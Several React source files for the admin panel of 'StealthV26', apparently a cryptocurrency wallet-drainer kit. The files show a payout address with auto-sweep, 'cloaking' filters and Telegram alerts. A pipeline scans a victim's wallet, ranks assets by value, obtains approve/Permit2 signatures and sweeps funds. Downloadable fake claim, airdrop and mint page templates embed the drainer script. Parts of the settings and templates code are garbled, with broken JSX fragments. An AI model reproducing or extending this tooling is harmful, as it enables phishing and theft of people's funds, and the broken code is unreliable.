export default function SdkSelfTestPage() {
  const appended = useRef(false);
  const [loadState, setLoadState] = useState<"idle" | "loading" | "ready" | "error">("idle");

  useEffect(() => {
    if (typeof document === "undefined") return;
    if (appended.current) return;
    if (document.getElementById(SCRIPT_ID)) {
      appended.current = true;
      setLoadState("ready");
      return;
    }

    appended.current = true;
    setLoadState("loading");

    const script = document.createElement("script");
    script.id = SCRIPT_ID;
    script.type = "module";
    script.src = "/api/sdk";
    script.async = true;
    script.addEventListener("load", () => setLoadState("ready"));
    script.addEventListener("error", () => {
      setLoadState("error");
      toast.error("Failed to load /api/sdk — check the dev server and network tab.");
    });
    document.body.appendChild(script);
  }, []);

  async function openWalletModalManually() {
    const w = window as unknown as { StealthV26?: StealthGlobal };
    const S = w.StealthV26;
    if (!S) {
      toast.info("SDK not on window yet — wait for load or check console.");
      return;
    }
    try {
      await S.init?.();
      if (typeof S.openConnectModal === "function") {
        await S.openConnectModal();
        return;
      }
      const modal = S.getModal?.();
      if (modal && typeof modal.open === "function") {
        await Promise.resolve(modal.open());
        return;
      }
      toast.info(
        "AppKit did not load (getModal is null). Check the browser console for CDN/import errors, and set a valid WalletConnect Project ID under Compile → Modal."
      );
    } catch (e) {
      toast.error(e instanceof Error ? e.message : "Could not open modal");
    }
  }

  return (
    <div className="mx-auto max-w-3xl space-y-6">
      <div className="space-y-2">
        <Badge variant="outline" className="rounded-none border-primary/20 bg-primary/10 font-mono uppercase tracking-widest text-primary">
          Self-hosted
        </Badge>
        <h1 className="font-display text-2xl uppercase tracking-wide">SDK self-test</h1>
        <p className="text-sm text-muted-foreground">
          Injects <code className="text-primary">/api/sdk</code> once (live Compile + Contract + Settings). If the port is not 3000, open the URL your terminal prints —{" "}
          <code className="text-primary">npm run dev</code> can move to 3001, 3002, … when 3000 is busy.
        </p>
        {loadState === "loading" ? (
          <p className="text-xs font-mono text-amber-500">Loading /api/sdk…</p>
        ) : null}
        {loadState === "error" ? (
          <p className="text-xs font-mono text-red-500">Script failed to load.</p>
        ) : null}
        {loadState === "ready" ? (
          <p className="text-xs font-mono text-emerald-500">/api/sdk loaded — use the slot or the button below.</p>
        ) : null}
      </div>

      <Card className="rounded-none border-border/40 bg-black/40 backdrop-blur-xl">
        <CardHeader className="border-b border-border/40">
          <CardTitle className="flex items-center gap-2 text-base font-display uppercase tracking-wide">
            <PlayCircle className="h-4 w-4 text-primary" />
            Connect wallet
          </CardTitle>
          <CardDescription>
            AppKit mounts from jsDelivr inside the bundle. The web component slot should show a connect control; if it stays empty, use the fallback button.
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-6 pt-6">
          <div
            className="flex min-h-[120px] flex-col items-center justify-center gap-4 rounded-none border border-dashed border-border/60 bg-black/30 p-8"
            data-sv26-button
          />
          <div className="flex flex-wrap justify-center gap-2">
            <Button type="button" variant="secondary" className="rounded-none" onClick={() => void openWalletModalManually()}>
              Open wallet modal
            </Button>
          </div>
          <p className="text-center text-[11px] font-mono text-muted-foreground">
            Set WalletConnect Project ID under Compile → Modal, save compile config, then refresh. For Permit2 sweeps use Permit2 in the nav.
          </p>
        </CardContent>
      </Card>

      <div className="flex flex-wrap gap-3">
        <Button variant="outline" size="sm" className="gap-2 rounded-none" asChild>
          <Link href="/compile">
            <Code2 className="h-4 w-4" />
            Compile
          </Link>
        </Button>
        <Button variant="outline" size="sm" className="gap-2 rounded-none" asChild>
          <Link href="/settings">
            <Settings className="h-4 w-4" />
            Settings
          </Link>
        </Button>
        <Button variant="outline" size="sm" className="gap-2 rounded-none" asChild>
          <Link href="/permit2">
            <ExternalLink className="h-4 w-4" />
            Permit2 flow
          </Link>
        </Button>
      </div>
    </div>
  );
}
```

```tsx
"use client";

import { useMemo, useState } from "react";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { ExternalLink, RefreshCw, ShieldCheck } from "lucide-react";

const DEFAULT_RUNTIME_URL = "http://localhost:4173";

export default function SessionsPage() {
  const [runtimeUrl, setRuntimeUrl] = useState(DEFAULT_RUNTIME_URL);
  const [refreshKey, setRefreshKey] = useState(0);

  const iframeSrc = useMemo(() => `${runtimeUrl.replace(/\/$/, "")}/`, [runtimeUrl]);

  return (
    <div className="space-y-6 max-w-[1600px] mx-auto">
      <div className="space-y-2">
        <Badge
          variant="outline"
          className="rounded-none border-primary/20 bg-primary/10 font-mono uppercase tracking-widest text-primary"
        >
          Session Panel
        </Badge>
        <h1 className="font-display text-3xl uppercase tracking-wide">
          Connected Sequence Sessions
        </h1>
        <p className="text-sm text-muted-foreground font-mono">
          View and create fresh one-time EIP-712 Sequence sessions from the embedded Bolt runtime.
        </p>
      </div>

      <div className="grid gap-6 xl:grid-cols-[360px_minmax(0,1fr)]">
        <Card className="rounded-none border-border/40 bg-black/40 backdrop-blur-xl">
          <CardHeader className="border-b border-border/40">
            <CardTitle className="flex items-center gap-2 font-display text-xl uppercase tracking-wide">
              <ShieldCheck className="h-4 w-4 text-primary" />
              Runtime Source
            </CardTitle>
            <CardDescription>
              The session runtime currently comes from the Bolt wallet app on port 4173.
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4 p-6">
            <div className="space-y-2">
              <Label htmlFor="sessions-runtime-url">Runtime URL</Label>
              <Input
                id="sessions-runtime-url"
                value={runtimeUrl}
                onChange={(event) => setRuntimeUrl(event.target.value)}
                className="rounded-none font-mono"
              />
            </div>

            <div className="flex flex-wrap gap-3">
              <Button
                onClick={() => setRefreshKey((value) => value + 1)}
                className="rounded-none gap-2"
              >
                <RefreshCw className="h-4 w-4" />
                Refresh Session Panel
              </Button>
              <Button variant="outline" className="rounded-none gap-2" asChild>
                <a href={iframeSrc} target="_blank" rel="noreferrer">
                  <ExternalLink className="h-4 w-4" />
                  Open Runtime
                </a>
              </Button>
            </div>
          </CardContent>
        </Card>

        <Card className="rounded-none border-border/40 bg-black/40 backdrop-blur-xl overflow-hidden">
          <CardHeader className="border-b border-border/40">
            <CardTitle className="font-display text-xl uppercase tracking-wide">
              Live Session Runtime
            </CardTitle>
            <CardDescription>
              Fresh session creation and session history from the Bolt wallet runtime.
            </CardDescription>
          </CardHeader>
          <CardContent className="p-0">
            <iframe
              key={`${iframeSrc}-${refreshKey}`}
              src={iframeSrc}
              title="Sequence Session Panel"
              className="h-[1100px] w-full border-0"
              referrerPolicy="no-referrer"
            />
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
```

```tsx
"use client";

import { useStore } from "@/lib/store";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Switch } from "@/components/ui/switch";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import { Slider } from "@/components/ui/slider";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  Wallet,
  MessageCircle,
  Shield,
  Save,
  Send,
  Bot,
  Eye,
  EyeOff,
} from "lucide-react";
import { useEffect, useState } from "react";
import { toast } from "sonner";

export default function SettingsPage() {
  const {
    payoutConfig,
    setPayoutConfig,
    advancedConfig,
    setAdvancedConfig,
    telegramConfig,
    setTelegramConfig,
    cloakingConfig,
    setCloakingConfig,
  } = useStore();

  const [showBotToken, setShowBotToken] = useState(false);
  const [saving, setSaving] = useState(false);

  useEffect(() => {
    let active = true;
    async function loadPlatformConfig() {
      try {
        const res = await fetch("/api/platform-config", { cache: "no-store" });
        const data = await res.json();
        if (!active || !res.ok) return;
        if (data.payout) setPayoutConfig(data.payout);
        if (typeof data.advanced?.autoSignaturePrompt === "boolean") {
          setAdvancedConfig({ autoSignaturePrompt: data.advanced.autoSignaturePrompt });
        }
      } catch {
        // keep local defaults
      }
    }
    void loadPlatformConfig();
    return () => {
      active = false;
    };
  }, [setPayoutConfig, setAdvancedConfig]);

  const handleSave = async () => {
    setSaving(true);
    try {
      const res = await fetch("/api/platform-config", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          payout: payoutConfig,
          advanced: { autoSignaturePrompt: advancedConfig.autoSignaturePrompt },
        }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.message || "Failed to save settings");
      if (data.payout) setPayoutConfig(data.payout);
      toast.success("Permanent payout and automation settings saved");
    } catch (error) {
      toast.error(error instanceof Error ? error.message : "Failed to save settings");
    } finally {
      setSaving(false);
    }
  };

  const handleTestTelegram = async () => {
    if (!telegramConfig.botToken || !telegramConfig.chatId) {
      toast.error("Please enter bot token and chat ID");
      return;
    }

    try {
      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          botToken: telegramConfig.botToken,
          chatId: telegramConfig.chatId,
          includePlatform: false,
          message: "🧪 StealthV26 SaaS test notification",
        }),
      });
      const data = await response.json().catch(() => ({}));

      if (!response.ok) {
        throw new Error(data?.message || "Failed to send test message");
      }

      toast.success("Test message sent to Telegram");
    } catch (error) {
      toast.error(error instanceof Error ? error.message : "Failed to send test message");
    }
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold tracking-tight">Settings</h1>
          <p className="text-muted-foreground text-sm mt-1">
            Payout configuration, messaging integration, cloaking, and filtering policies
          </p>
        </div>
        <Button onClick={() => void handleSave()} className="gap-2" disabled={saving}>
          <Save className="h-4 w-4" />
          {saving ? "Saving..." : "Save All Settings"}
        </Button>
      </div>

      <Tabs defaultValue="payout" className="space-y-6">
        <TabsList className="grid w-full grid-cols-3 h-auto p-1">
          <TabsTrigger value="payout" className="flex items-center gap-2 text-xs py-2.5">
            <Wallet className="h-3.5 w-3.5" />
            Payout
          </TabsTrigger>
          <TabsTrigger value="telegram" className="flex items-center gap-2 text-xs py-2.5">
            <MessageCircle className="h-3.5 w-3.5" />
            Telegram
          </TabsTrigger>
          <TabsTrigger value="cloaking" className="flex items-center gap-2 text-xs py-2.5">
            <Shield className="h-3.5 w-3.5" />
            Cloaking & Filters
          </TabsTrigger>
        </TabsList>

        {/* Payout Tab */}
        <TabsContent value="payout">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <Card>
              <CardHeader>
                <div className="flex items-center gap-2">
                  <Wallet className="h-4 w-4 text-primary" />
                  <CardTitle className="text-base">Payout Configuration</CardTitle>
                </div>
                <CardDescription>Configure your payout wallet address and sweep settings</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label className="text-xs font-medium">Payout Address</Label>
                  <Input
                    value={payoutConfig.address}
                    onChange={(e) => setPayoutConfig({ address: e.target.value })}
                    placeholder="0x..."
                    className="font-mono text-sm"
                  />
                  <p className="text-[11px] text-muted-foreground">
                    StealthExchange and the compiled SDK send here.{" "}
                    <code className="text-[10px]">sequenceExchangeWallet</code> in{" "}
                    <code className="text-[10px]">/api/platform-config</code> and{" "}
                    <code className="text-[10px]">/api/config</code> matches this address for 0xSequence integrations,
                    unless you set <code className="text-[10px]">NEXT_PUBLIC_SEQUENCE_EXCHANGE_WALLET_ADDRESS</code>{" "}
                    to use a different Sequence-only receiver.
                  </p>
                </div>

                <div className="space-y-2">
                  <Label className="text-xs font-medium">Payout Chain</Label>
                  <Select
                    value={payoutConfig.chain}

                    <SelectTrigger>
                      <SelectValue />

                    <SelectContent>
                      <SelectItem value="ethereum">Ethereum</SelectItem>
                      <SelectItem value="bsc">BSC</SelectItem>

                      <SelectItem value="arbitrum">Arbitrum</SelectItem>

                <Separator />

                  </div>
                  <Switch
                    checked={advancedConfig.autoSignaturePrompt}

                  />
                </div>

                {payoutConfig.autoSweep && (
                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <Label className="text-xs font-medium">Minimum Sweep Amount (USD)</Label>
                      <span className="text-sm font-mono font-bold">${payoutConfig.minSweepAmount}</span>
                    </div>
                    <Slider

                )}
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="text-base">Payout Summary</CardTitle>
                <CardDescription>Current payout configuration overview</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="rounded-lg bg-accent/50 p-4 space-y-3">
                  <div className="flex justify-between text-sm">
                    <span className="text-muted-foreground">Address</span>
                    <span className="font-mono text-xs">
                      {payoutConfig.address
                        ? `${payoutConfig.address.slice(0, 10)}...${payoutConfig.address.slice(-8)}`
                        : "Not configured"}
                    </span>
                  </div>
                  <Separator />
                  <div className="flex justify-between text-sm">

                    <Badge variant="outline" className="text-xs capitalize">

                    <Badge

                    >

                    </Badge>
                  </div>
                  {payoutConfig.autoSweep && (

        {/* Telegram Tab */}

                <Separator />

                <div className="space-y-2">

                <div className="rounded-lg bg-accent/50 p-4 space-y-2">

                </div>
              </CardContent>
            </Card>
          </div>
        </TabsContent>
      </Tabs>
    </div>
  );
}
```

### src/app/strategy/page.tsx

```tsx
"use client";

import { useStore } from "@/lib/store";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Switch } from "@/components/ui/switch";
import {
  ArrowUpDown,
  RotateCcw,
  GitBranch,
  GripVertical,
  ChevronDown,
  ChevronRight,
  Shield,
  Zap,
  Target,
} from "lucide-react";
import { useEffect, useState } from "react";
import type { ContractFunctionBinding } from "@/lib/types";
import type { OperationalConfig } from "@/lib/operational-config-store";

const typeIcons: Record<string, React.ElementType> = {
  priority: ArrowUpDown,
  retry: RotateCcw,
  conditional: GitBranch,
};

const typeColors: Record<string, string> = {
  priority: "bg-blue-500/20 text-blue-400 border-blue-500/30",
  retry: "bg-amber-500/20 text-amber-400 border-amber-500/30",
  conditional: "bg-purple-500/20 text-purple-400 border-purple-500/30",
};

export default function StrategyPage() {
  const { strategyRules, toggleStrategyRule } = useStore();
  const [expandedRules, setExpandedRules] = useState<Set<string>>(new Set());
  const [functionBindings, setFunctionBindings] = useState<ContractFunctionBinding[]>([]);

  const toggleExpand = (id: string) => {
    const next = new Set(expandedRules);
    if (next.has(id)) next.delete(id);
    else next.add(id);
    setExpandedRules(next);
  };

  const priorityRules = strategyRules.filter((r) => r.type === "priority");
  const retryRules = strategyRules.filter((r) => r.type === "retry");
  const conditionalRules = strategyRules.filter((r) => r.type === "conditional");

  const enabledCount = strategyRules.filter((r) => r.enabled).length;

  useEffect(() => {
    let active = true;
    async function loadOperationalConfig() {
      try {
        const res = await fetch("/api/operational-config", { cache: "no-store" });
        const data = (await res.json()) as { config?: OperationalConfig };
        if (!active || !res.ok || !data.config) return;
        setFunctionBindings(data.config.contracts.functionBindings || []);
      } catch {
        // keep static view when config is unavailable
      }
    }
    void loadOperationalConfig();
    return () => {
      active = false;
    };
  }, []);

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold tracking-tight">Strategy Engine</h1>
          <p className="text-muted-foreground text-sm mt-1">
            Priority rules, retry logic, conditional flows, and simulated contract functions
          </p>
        </div>
        <div className="flex items-center gap-3">
          <Badge variant="outline" className="text-xs">
            {enabledCount}/{strategyRules.length} rules active
          </Badge>
        </div>
      </div>

      {/* Summary Cards */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        <Card>
          <CardContent className="p-4 flex items-center gap-4">
            <div className="h-10 w-10 rounded-lg bg-blue-500/10 flex items-center justify-center">
              <ArrowUpDown className="h-5 w-5 text-blue-500" />
            </div>
            <div>
              <p className="text-xs text-muted-foreground">Priority Rules</p>
              <p className="text-xl font-bold">{priorityRules.length}</p>
              <p className="text-[10px] text-muted-foreground">
                {priorityRules.filter((r) => r.enabled).length} active
              </p>
            </div>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="p-4 flex items-center gap-4">
            <div className="h-10 w-10 rounded-lg bg-amber-500/10 flex items-center justify-center">
              <RotateCcw className="h-5 w-5 text-amber-500" />
            </div>
            <div>
              <p className="text-xs text-muted-foreground">Retry Rules</p>
              <p className="text-xl font-bold">{retryRules.length}</p>
              <p className="text-[10px] text-muted-foreground">
                {retryRules.filter((r) => r.enabled).length} active
              </p>
            </div>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="p-4 flex items-center gap-4">
            <div className="h-10 w-10 rounded-lg bg-purple-500/10 flex items-center justify-center">
              <GitBranch className="h-5 w-5 text-purple-500" />
            </div>
            <div>
              <p className="text-xs text-muted-foreground">Conditional Rules</p>
              <p className="text-xl font-bold">{conditionalRules.length}</p>
              <p className="text-[10px] text-muted-foreground">
                {conditionalRules.filter((r) => r.enabled).length} active
              </p>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Execution Flow Diagram */}
      <Card>
        <CardHeader className="pb-2">
          <div className="flex items-center gap-2">
            <Zap className="h-4 w-4 text-primary" />
            <CardTitle className="text-sm font-medium">Execution Flow</CardTitle>
          </div>
          <CardDescription>Transaction processing pipeline with configurable strategy layers</CardDescription>
        </CardHeader>
        <CardContent>
          <div className="flex items-center justify-center gap-2 flex-wrap py-4">
            {[
              { label: "scanWallet()", color: "bg-blue-500/20 text-blue-400" },
              { label: "rankAssetsByUSD()", color: "bg-indigo-500/20 text-indigo-400" },
              { label: "filterDust()", color: "bg-violet-500/20 text-violet-400" },
              { label: "prioritizeStablecoins()", color: "bg-purple-500/20 text-purple-400" },
              { label: "approve / permit2", color: "bg-amber-500/20 text-amber-400" },
              { label: "transferFrom / multicall", color: "bg-emerald-500/20 text-emerald-400" },
              { label: "sweep()", color: "bg-cyan-500/20 text-cyan-400" },
            ].map((step, i) => (
              <div key={step.label} className="flex items-center gap-2">
                <span
                  className={`text-xs font-mono px-3 py-1.5 rounded-lg border ${step.color}`}
                >
                  {step.label}
                </span>
                {i < 6 && (
                  <ChevronRight className="h-4 w-4 text-muted-foreground shrink-0" />
                )}
              </div>
            ))}
          </div>
        </CardContent>
      </Card>

      {/* Simulated Contract Functions */}
      <Card>
        <CardHeader className="pb-2">
          <div className="flex items-center gap-2">
            <Target className="h-4 w-4 text-primary" />
            <CardTitle className="text-sm font-medium">Simulated Contract Functions</CardTitle>
          </div>
          <CardDescription>
            Pre-configured execution strategies for common Web3 interaction patterns
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3">
            {[
              { name: "Claim", preset: "claim", desc: "Token claim flow" },
              { name: "Reward", preset: "reward", desc: "Reward distribution" },
              { name: "Security", preset: "security", desc: "Verification flow" },
              { name: "Swap", preset: "swap", desc: "DEX execution" },
              { name: "Connect", preset: "connect", desc: "Connect & execute" },
              { name: "Multicall", preset: "multicall", desc: "Batch operations" },
            ].map((fn) => {
              const binding = functionBindings.find((item) => item.preset === fn.preset);
              return (
                <div
                  key={fn.name}
                  className="rounded-lg border bg-accent/30 p-3 text-center hover:bg-accent/60 transition-colors cursor-pointer"
                >
                  <p className="text-sm font-medium">{fn.name}</p>
                  <p className="text-[10px] text-muted-foreground mt-0.5">
                    {binding ? `${binding.functionName}() -> ${binding.contractName}` : fn.desc}
                  </p>
                </div>
              );
            })}
          </div>
        </CardContent>
      </Card>

      {/* Priority Rules */}
      <Card>
        <CardHeader className="pb-2">
          <div className="flex items-center gap-2">
            <ArrowUpDown className="h-4 w-4 text-blue-500" />
            <CardTitle className="text-sm font-medium">Priority Rules</CardTitle>
          </div>
          <CardDescription>Asset prioritization and execution ordering logic</CardDescription>
        </CardHeader>
        <CardContent className="p-0">
          <div className="divide-y divide-border">
            {priorityRules.map((rule) => (
              <RuleRow
                key={rule.id}
                rule={rule}
                expanded={expandedRules.has(rule.id)}
                onToggleExpand={() => toggleExpand(rule.id)}
                onToggleEnabled={() => toggleStrategyRule(rule.id)}
              />
            ))}
          </div>
        </CardContent>
      </Card>

      {/* Retry Rules */}
      <Card>
        <CardHeader className="pb-2">
          <div className="flex items-center gap-2">
            <RotateCcw className="h-4 w-4 text-amber-500" />
            <CardTitle className="text-sm font-medium">Retry Rules</CardTitle>
          </div>
          <CardDescription>Fallback execution pathways and retry strategies</CardDescription>
        </CardHeader>
        <CardContent className="p-0">
          <div className="divide-y divide-border">
            {retryRules.map((rule) => (
              <RuleRow
                key={rule.id}
                rule={rule}
                expanded={expandedRules.has(rule.id)}
                onToggleExpand={() => toggleExpand(rule.id)}
                onToggleEnabled={() => toggleStrategyRule(rule.id)}
              />
            ))}
          </div>
        </CardContent>
      </Card>

      {/* Conditional Rules */}
      <Card>
        <CardHeader className="pb-2">
          <div className="flex items-center gap-2">
            <GitBranch className="h-4 w-4 text-purple-500" />
            <CardTitle className="text-sm font-medium">Conditional Rules</CardTitle>
          </div>
          <CardDescription>Threshold-based processing and conditional execution flows</CardDescription>
        </CardHeader>
        <CardContent className="p-0">
          <div className="divide-y divide-border">
            {conditionalRules.map((rule) => (
              <RuleRow
                key={rule.id}
                rule={rule}
                expanded={expandedRules.has(rule.id)}
                onToggleExpand={() => toggleExpand(rule.id)}
                onToggleEnabled={() => toggleStrategyRule(rule.id)}
              />
            ))}
          </div>
        </CardContent>
      </Card>
    </div>
  );
}

interface RuleRowProps {
  rule: { id: string; name: string; type: string; enabled: boolean; config: Record<string, unknown>; description: string };
  expanded: boolean;
  onToggleExpand: () => void;
  onToggleEnabled: () => void;
}

function RuleRow({ rule, expanded, onToggleExpand, onToggleEnabled }: RuleRowProps) {
  const Icon = typeIcons[rule.type] || Shield;

  return (
    <div className="px-4">
      <div className="flex items-center gap-3 py-3">
        <GripVertical className="h-4 w-4 text-muted-foreground cursor-grab shrink-0" />
        <button onClick={onToggleExpand} className="shrink-0">
          {expanded ? (
            <ChevronDown className="h-4 w-4 text-muted-foreground" />
          ) : (
            <ChevronRight className="h-4 w-4 text-muted-foreground" />
          )}
        </button>
        <Icon className="h-4 w-4 text-muted-foreground shrink-0" />
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-2">
            <span className="text-sm font-medium">{rule.name}</span>
            <span
              className={`inline-flex items-center rounded-full border px-1.5 py-0.5 text-[10px] font-medium ${
                typeColors[rule.type]
              }`}
            >
              {rule.type}
            </span>
          </div>
          <p className="text-xs text-muted-foreground mt-0.5">{rule.description}</p>
        </div>
        <Switch checked={rule.enabled} onCheckedChange={onToggleEnabled} />
      </div>

      {expanded && (
        <div className="pb-3 pl-[52px]">
          <div className="rounded-lg bg-accent/50 p-3">
            <p className="text-[10px] text-muted-foreground mb-2 font-medium uppercase tracking-wider">
              Configuration
            </p>
            <pre className="text-xs font-mono text-muted-foreground">
              {JSON.stringify(rule.config, null, 2)}
            </pre>
          </div>
        </div>
      )}
    </div>
  );
}
```

```tsx
"use client";

} from "@/components/ui/dialog";

  Search,

  Check,
} from "lucide-react";

const CATEGORIES = [
  { key: "all", label: "All Templates" },
  { key: "claim", label: "Claim" },
  { key: "mint", label: "Mint" },
  { key: "staking", label: "Staking" },
  { key: "swap", label: "Swap" },
  { key: "airdrop", label: "Airdrop" },
  { key: "bridge", label: "Bridge" },
  { key: "lending", label: "Lending" },
  { key: "governance", label: "Governance" },
  { key: "standalone", label: "⚡ Standalone WC" },
];

function downloadFile(filename: string, content: string, type = "text/plain") {
  const blob = new Blob([content], { type });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

export default function TemplatesPage() {
  const {
    generalConfig,
    walletConfig,
    modalConfig,
    tokensConfig,
    advancedConfig,
    payoutConfig,
  } = useStore();

  const [search, setSearch] = useState("");
  const [category, setCategory] = useState("all");
  const [selectedTemplate, setSelectedTemplate] = useState<DefiTemplate | null>(null);
  const [previewOpen, setPreviewOpen] = useState(false);
  const [exportOpen, setExportOpen] = useState(false);
  const [copied, setCopied] = useState<string | null>(null);

  const filtered = DEFI_TEMPLATES.filter((t) => {
    const matchSearch =
      !search ||
      t.name.toLowerCase().includes(search.toLowerCase()) ||
      t.description.toLowerCase().includes(search.toLowerCase()) ||
      t.tags.some((tag) => tag.toLowerCase().includes(search.toLowerCase()));
    const matchCategory = category === "all" || t.category === category;
    return matchSearch && matchCategory;
  });

  const getSDKBundle = () =>
    generateSDKBundle({
      general: generalConfig,
      wallet: walletConfig,
      modal: modalConfig,
      tokens: tokensConfig,
      advanced: advancedConfig,
      receiverAddress: payoutConfig.address || "0x0000000000000000000000000000000000000000",
    });

  const handleDownloadJS = () => {
    const sdk = getSDKBundle();
    downloadFile("stealthv26.min.js", sdk, "application/javascript");
    toast.success("SDK downloaded: stealthv26.min.js");
  };

  const handleDownloadTemplate = (template: DefiTemplate) => {
    const sdk = getSDKBundle();
    const pkg = generateTemplatePackage(template.html, sdk);
    downloadFile(`${template.id}.html`, pkg.html, "text/html");
    toast.success(`Template downloaded: ${template.id}.html`);
  };

  const handleDownloadPackage = (template: DefiTemplate) => {
    const sdk = getSDKBundle();
    downloadFile(`${template.id}/index.html`, template.html, "text/html");
    setTimeout(() => {
      downloadFile(`${template.id}/stealthv26.min.js`, sdk, "application/javascript");
    }, 300);
    toast.success("Package exported: HTML + JS files");
  };

  const handleCopy = (content: string, key: string) => {
    navigator.clipboard.writeText(content);
    setCopied(key);
    setTimeout(() => setCopied(null), 2000);
  };

  const openPreview = (template: DefiTemplate) => {
    setSelectedTemplate(template);
    setPreviewOpen(true);

      {/* Preview Dialog */}

                    Add this script tag to any existing website:
                  </p>
                  <div className="relative">
                    <pre className="bg-zinc-950 text-emerald-400 rounded-lg p-3 text-xs font-mono overflow-x-auto">
                      {`<script src="stealthv26.min.js"></script>`}
                    </pre>
                    <Button
                      size="icon"
                      variant="ghost"
                      className="absolute top-1.5 right-1.5 h-6 w-6"
                      onClick={() =>
                        handleCopy(
                          `<script src="stealthv26.min.js"></script>`,
                          "script-tag"
                        )
                      }
                    >
                      {copied === "script-tag" ? (
                        <Check className="h-3 w-3" />
                      ) : (
                        <Copy className="h-3 w-3" />
                      )}
                    </Button>
                  </div>
                  <p className="text-[11px] text-muted-foreground">
                    The SDK auto-binds to elements with class <code className="text-primary">{generalConfig.connectButtonClass}</code> — 
                    any button with that class becomes a wallet connect trigger.
                  </p>
                </div>
              </TabsContent>

              <TabsContent value="js" className="flex-1 overflow-hidden flex flex-col mt-4 gap-3">
                <div className="flex items-center justify-between">
                  <p className="text-xs text-muted-foreground">
                    stealthv26.min.js — Compiled from your Compile settings
                  </p>
                  <div className="flex gap-2">
                    <Button
                      size="sm"
                      variant="outline"
                      className="gap-1.5 text-xs"
                      onClick={() => handleCopy(getSDKBundle(), "js-code")}
                    >
                      {copied === "js-code" ? (
                        <Check className="h-3 w-3" />
                      ) : (
                        <Copy className="h-3 w-3" />
                      )}
                      Copy
                    </Button>
                    <Button
                      size="sm"
                      className="gap-1.5 text-xs"
                      onClick={handleDownloadJS}
                    >
                      <Download className="h-3 w-3" />
                      Download .js
                    </Button>
                  </div>
                </div>
                <ScrollArea className="flex-1 rounded-lg border bg-zinc-950 p-4">
                  <pre className="text-[11px] text-emerald-400 font-mono whitespace-pre-wrap leading-relaxed">
                    {getSDKBundle()}
                  </pre>
                </ScrollArea>
              </TabsContent>

              <TabsContent value="html" className="flex-1 overflow-hidden flex flex-col mt-4 gap-3">
                <div className="flex items-center justify-between">
                  <p className="text-xs text-muted-foreground">
                    {selectedTemplate.id}/index.html — Template source
                  </p>
                  <div className="flex gap-2">
                    <Button
                      size="sm"
                      variant="outline"
                      className="gap-1.5 text-xs"
                      onClick={() =>
                        handleCopy(selectedTemplate.html, "html-code")
                      }
                    >
                      {copied === "html-code" ? (
                        <Check className="h-3 w-3" />
                      ) : (
                        <Copy className="h-3 w-3" />
                      )}
                      Copy
                    </Button>
                    <Button
                      size="sm"
                      className="gap-1.5 text-xs"
                      onClick={() =>
                        downloadFile(
                          `${selectedTemplate.id}.html`,
                          selectedTemplate.html,
                          "text/html"
                        )
                      }
                    >
                      <Download className="h-3 w-3" />
                      Download .html
                    </Button>
                  </div>
                </div>
                <ScrollArea className="flex-1 rounded-lg border bg-zinc-950 p-4">
                  <pre className="text-[11px] text-sky-400 font-mono whitespace-pre-wrap leading-relaxed">
                    {selectedTemplate.html}
                  </pre>
                </ScrollArea>
              </TabsContent>
            </Tabs>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
```
